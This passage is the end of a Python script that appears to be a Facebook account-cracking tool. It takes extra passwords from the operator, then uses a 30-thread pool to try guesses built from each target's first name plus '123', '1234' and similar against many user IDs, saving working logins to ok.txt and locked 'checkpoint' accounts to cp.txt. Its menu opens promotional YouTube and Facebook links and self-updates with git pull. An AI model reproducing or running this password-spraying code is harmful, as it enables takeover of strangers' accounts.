
                   print('\n\x1b[1;96m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
                   print('\x1b[1;95m     疊╔═╦═────••♽••─────═╦═╗疊')
                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")       
                   expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
                   expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password2 \033[1;91m: \033[1;92m")
                   expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password3 \033[1;91m: \033[1;92m")
                   aahh('\x1b[1;94m────────────────────────────────────────────────────\n')
                   ikeh_ikeh_kimochi()
                   jembut()
                   print('\n\x1b[1;92m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
                   print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦═╗疊')
                   print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")
                   print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1b[1;97m] the result\x1b[1;93m CP\x1b[1;97m saved to : cp.txt')
                   print('\n [\x1b[1;91m!\x1b[1;97m] turn off data to stop the process\n')
                   with ThreadPoolExecutor(max_workers=30) as ex:
                          for user in username:
                                  users = user.split('|')
                                  ss = users[0].split(' ')
                                  for x in ss:
                                          listpass = [
                                                  str(x) + '123',
                                                  str(x) + '1234',
                                                  str(x) + '12345',
                                                  str(x) + '123456',
                                                  ]
                                          listpass.append(expass)
                                          for passw in set(listpass):
                                                  ex.submit(login,(users[1]),(passw))
                   if check != 0 or result != 0:
                           time.sleep(0.1)
                           print("\n\n\x1b[1;92m  *\x1b[1;97m finished.")
     
                   else:
                           print("\n\n\x1b[1;96m  *\x1b[1;97m you got no results:(")
               except (KeyboardInterrupt,EOFError):
                       exit()
               except requests.exceptions.ConnectionError:
                       exit("\n\n\033[00m  [\033[91m!\033[00m] no Connection")

    elif yayan == "2" or yayan =="02":
         os.system("xdg-open https://youtu.be/72zvkSbVPOI") 
         yayanxd()
    elif yayan == "3" or yayan =="03":
         os.system('xdg-open https://www.facebook.com/groups/1592269051080491')
         yayanxd()
    elif yayan == "4" or yayan =="04":
         os.system('xdg-open https://www.facebook.com/groups/3877586212335618')
         yayanxd()
    elif yayan == "5" or yayan =="05":
         print("\n\n\x1b[1;97m      [ \x1b[1;92mPlease Wait While Updating The Tools \x1b[1;97m]\n")
         os.system("git pull")
         print("\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Successfully Updated!\n ")
         yayanxd()
    elif yayan == "0" or yayan =="00":
         aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
         os.system('xdg-open https://youtube.com/channel/xxxxx-mg')
         exit()                   	

if __name__=="__main__":
     ikeh_ikeh_kimochi()
     croot()
     ikeh_ikeh_kimochi()
     kontol()
     moch_yayan()
     yayanxd()
